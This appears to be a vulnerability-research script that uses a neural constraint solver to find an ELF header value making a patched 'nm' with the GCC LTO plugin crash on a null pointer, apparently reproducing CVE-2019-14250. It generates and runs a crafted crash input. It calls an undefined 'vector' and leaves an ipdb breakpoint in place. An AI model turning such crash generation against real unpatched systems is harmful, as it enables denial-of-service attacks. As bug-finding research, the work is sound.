import os, sys
import struct
from pprint import pformat
import numpy as np
import argparse

from engine import NeuSolv, stat
from nao.fs import FileSystem
from nao.util import get_addr_from_env, strip_null, round_real_to_char, round_real_to_uint, vectorize
from nao.tactics import Tactic
from nao.program import Program, X
from nao.ast import constraint as ir
from nao.exceptions import UnhandledCaseError

with open('sample/simple-elf-checker') as f:
    elf_file = list(f.read())

def xadapter(v):
    global elf_file
    try:
        e_shstrndx = struct.pack("<H", round_real_to_uint(v[0]))
        content = elf_file
        content[0x3e:0x3e+2] = e_shstrndx # update e_shstrndx
        print("e_shstrndx = {!r}".format(e_shstrndx))
        fs = FileSystem('./fs-cve-2019-14250/')
        content = ''.join(elf_file)
        fs.create('test.elf', content)
        return X(args=["--plugin", "/usr/lib/gcc/x86_64-linux-gnu/7/liblto_plugin.so.0", fs.path('test.elf')], files=fs, env={'LD_LIBRARY_PATH': '/usr/lib/gcc/x86_64-linux-gnu/7'}) # sage var -> program input
    except Exception as e:
        import traceback
        print("\nException: {} {}".format(e.__class__.__name__, e))
        traceback.print_exc()
        print()
        print("-> v = {}".format(v))
        import ipdb; ipdb.set_trace()
        exit(1)

def main():
    ### Load analysis target[]
    p = Program("sample/nm.patched", xadapter, debug=False)

    ### Generate post condition y
    name_liblto_plugin_so = 'liblto_plugin.so.0.0.0'
    addr_segv = 0x98F0
    call_segv_trigger = 0x9b69
    ### TODO: Tactics NullPointerDereference
    # constraints = p.get_constraints(Tactic.near_path_constraint, object_name=name_liblto_plugin_so, relative_addr=addr_segv)
    constraints = ir.Eq(ir.Variable('rdi', 8,  call_segv_trigger, ir.Register('rdi'), name_liblto_plugin_so), ir.Value(0))
    print("[*] constraints = {}".format(pformat(constraints)))
    print("[*] variables = {}".format(pformat(constraints.get_variables())))

    ### Define function N
    N = p.N(constraints)

    ### Define loss function
    L = p.L(constraints)

    ### Solve constraints
    # model = NeuSolv(N, L, vector([28]), xadapter)
    model = NeuSolv(N, L, vector([1]), xadapter)

    print("=" * 8)
    if model is not None:
        print("[*] found")
        print("y constraints = {}".format(constraints))
        print("model: {}".format(model))
        print("-> {!r}".format(xadapter(model)))

        stdout, stderr = p.run(xadapter(model))
        print("[*] stdout:")
        print(stdout)
        print("[*] stderr:")
        print(stderr)
    else:
        print("[*] not found")

    print("-" * 8)
    if stat.lap_time:
        print("Measured epics time:")
        print("\tmean   = {} sec".format(np.mean(stat.lap_time)))
        print("\tmedian = {} sec".format(np.median(stat.lap_time)))
        print("\tstd.   = {} sec".format(np.std(stat.lap_time)))

    print("-" * 8 + "\n")

if __name__ == "__main__":
    main()